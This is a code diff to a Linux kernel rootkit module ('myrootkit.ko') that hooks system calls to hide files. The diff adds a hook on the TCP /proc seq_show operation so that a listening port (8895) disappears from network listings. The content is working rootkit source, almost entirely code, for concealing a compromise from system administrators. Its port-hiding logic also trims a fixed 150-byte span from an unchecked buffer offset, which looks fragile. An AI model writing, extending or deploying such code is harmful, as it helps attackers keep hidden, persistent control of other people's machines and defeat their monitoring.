@@ -19,8 +19,10 @@ static unsigned long **hook_syscall_table(void);
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
 static int callMonitor(char *type, const char *msg);
 static int configMonitor(char *msg);
+static void hook_port(void);
 
 // Kernel system call
+int (*kernel_seq_show)(struct seq_file *seq, void *v);
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
 asmlinkage long (*kernel_unlink)(const char __user *pathname);
@@ -29,6 +31,7 @@ asmlinkage long (*kernel_init_module)(void __user *  umod,  unsigned long len,
                                               const char __user * uargs);
 
 // Hooked system call
+int hooked_seq_show(struct seq_file *seq, void *v);
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
 asmlinkage long hooked_unlink(const char __user *pathname);
@@ -42,6 +45,7 @@ char *INEXISTMONITOR = "SETMONITORPROGRAM";
 char *hidfiles[256];
 char *monitor = NULL;
 char *workdir = NULL;
+int port = 8895;
 int filenum;
 int moni_open;
 int moni_unlink;
@@ -72,14 +76,14 @@ static int lkm_init(void)
     syscall_table[__NR_init_module] = (unsigned long *)hooked_init_module;
     ENABLE_WRITE_PROTECTION;
     
+    hook_port();
+    
     hidfiles[0] = "cmdoutput.txttmp";
     hidfiles[1] = "myrootkit.ko";
     hidfiles[2] = "ccprogram";
     hidfiles[3] = "ccprogram.c";
-    hidfiles[4] = "monitor";
-    hidfiles[5] = "monitor.c";
-    hidfiles[6] = "monitoroutput.txttmp";
-    filenum=7;
+    hidfiles[4] = "monitoroutput.txttmp";
+    filenum=5;
     moni_open = 0;
     moni_unlink = 0;
     moni_init_module = 0;
@@ -224,6 +228,38 @@ asmlinkage long hooked_unlink(const char __user *filename){
         callMonitor("unlink", filename);
     }
     return kernel_unlink(filename);
+}
+
+int hooked_seq_show(struct seq_file *seq, void *v){
+    int ret;
+    char needle[6];
+    
+    snprintf(needle, NEEDLE_LEN, ":%04X", port);
+    ret = kernel_seq_show(seq, v);
+
+    if (strnstr(seq->buf + seq->count - 150, needle, 150)) {
+        fm_alert("Hiding port %d using needle %s.\n",
+                 port, needle);
+        seq->count -= 150;
+    }
+
+    return ret;
+}
+
+static void hook_port(void){
+    struct file *filp;                                      
+    struct tcp_seq_afinfo *afinfo;                                  
+                                                         
+    filp = filp_open(NET_ENTRY, O_RDONLY, 0);                 
+    if (IS_ERR(filp)) {                             
+        return;                               
+    } 
+    afinfo = PDE_DATA(filp->f_path.dentry->d_inode); 
+    kernel_seq_show = afinfo->seq_ops.op;                         
+    afinfo->seq_ops.op = hooked_seq_show;                         
+                                                     
+    filp_close(filp, 0);                               
+              
 }
  
 static void lkm_exit(void)
